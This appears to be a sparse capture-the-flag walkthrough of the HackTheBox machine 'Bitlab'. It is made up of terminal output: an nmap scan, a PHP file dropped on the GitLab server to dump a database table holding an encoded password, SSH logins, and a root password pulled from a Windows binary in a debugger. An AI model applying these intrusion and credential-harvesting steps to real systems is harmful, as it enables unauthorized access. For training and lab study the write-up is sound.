---
title: "HackTheBox - Bitlab"
date: 2010-01-01T01:01:56+01:00
toc: false
images:
tags:
  - hackthebox
  - ctf
---

[![Kurzes Video Walkthrough ohne Erklärungen](http://img.youtube.com/vi/YOUTUBE_VIDEO_ID_HERE/0.jpg)](http://www.youtube.com/watch?v=YOUTUBE_VIDEO_ID_HERE)

root@kali:~# nmap -sV -sC 10.10.10.114
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-14 14:15 CET
Nmap scan report for 10.10.10.114
Host is up (0.019s latency).
Not shown: 998 filtered ports
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
| 2048 a2:3b:b0:dd:28:91:bf:e8:f9:30:82:31:23:2f:92:18 (RSA)
| 256 e6:3b:fb:b3:7f:9a:35:a8:bd:d0:27:7b:25:d4:ed:dc (ECDSA)
|_ 256 c9:54:3d:91:01:78:03:ab:16:14:6b:cc:f0:b7:3a:55 (ED25519)
80/tcp open http nginx
| http-robots.txt: 55 disallowed entries (15 shown)
| / /autocomplete/users /search /api /admin /profile
| /dashboard /projects/new /groups/new /groups/*/edit /users /help
|_/s/ /snippets/new /snippets/*/edit
| http-title: Sign in \xC2\xB7 GitLab
|_Requested resource was http://10.10.10.114/users/sign_in
|_http-trane-info: Problem with XML parsing of /evox/about
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.61 seconds
root@kali:~# ssh clave@10.10.10.114
The authenticity of host '10.10.10.114 (10.10.10.114)' can't be established.
ECDSA key fingerprint is SHA256:hNHxoptKsWqkzdME7Bfb+cGjskcAAGySJazK+gDDCHQ.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.114' (ECDSA) to the list of known hosts.
clave@10.10.10.114's password:
Last login: Tue Jan 14 12:14:39 2020 from 10.10.14.67
clave@bitlab:~$ cat user.txt
1e3#########ZENSIERT#########154
clave@bitlab:~$ clear




<?php
$db_connection = pg_connect("host=localhost dbname=profiles user=profiles password=profiles");
$result = pg_query($db_connection, "SELECT * FROM profiles");










http://10.10.10.114/profile/m10x.php

Array ( [0] => Array ( [id] => 1 [username] => clave [password] => c3NoLXN0cjBuZy1wQHNz== ) )




root@kali:~# scp clave@10.10.10.114:/home/clave/RemoteConnection.exe ./
clave@10.10.10.114's password:
RemoteConnection.exe 100% 14KB 287.3KB/s 00:00
root@kali:~# ollydbg RemoteConnection.exe
0009:err:ole:CoGetClassObject class {00000320-0000-0000-c000-000000000046} not registered
0009:err:ole:CoGetClassObject no class object {00000320-0000-0000-c000-000000000046} could be created for context 0x80000001
0009:err:ole:marshal_object couldn't get IPSFactory buffer for interface {00000131-0000-0000-c000-000000000046}
0009:err:ole:CoGetClassObject class {00000320-0000-0000-c000-000000000046} not registered
0009:err:ole:CoGetClassObject no class object {00000320-0000-0000-c000-000000000046} could be created for context 0x80000001
0009:err:ole:marshal_object couldn't get IPSFactory buffer for interface {00000122-0000-0000-c000-000000000046}
0009:err:ole:StdMarshalImpl_MarshalInterface Failed to create ifstub, hres=0x80004002
0009:err:ole:CoMarshalInterface Failed to marshal the interface {00000122-0000-0000-c000-000000000046}, 80004002
002a:err:console:AllocConsole Can't allocate console

























root@kali:~# 0033FE60 00411C18 ASCII "-ssh root@gitlab.htb -pw "Qf7]8YSV.wDNF*[7d?j&eD4^""
[1] 23151
-bash: eD4^: command not found
root@kali:~#
root@kali:~# -bash: 0033FE60: command not found

[1]+ Exit 127 0033FE60 00411C18 ASCII "-ssh root@gitlab.htb -pw "Qf7]8YSV.wDNF*[7d?j
root@kali:~# ssh root@10.10.10.114
root@10.10.10.114's password:
Last login: Tue Jan 14 13:44:48 2020 from 10.10.15.14
root@bitlab:~# cat root.txt
8d4#########ZENSIERT#########87c
root@bitlab:~#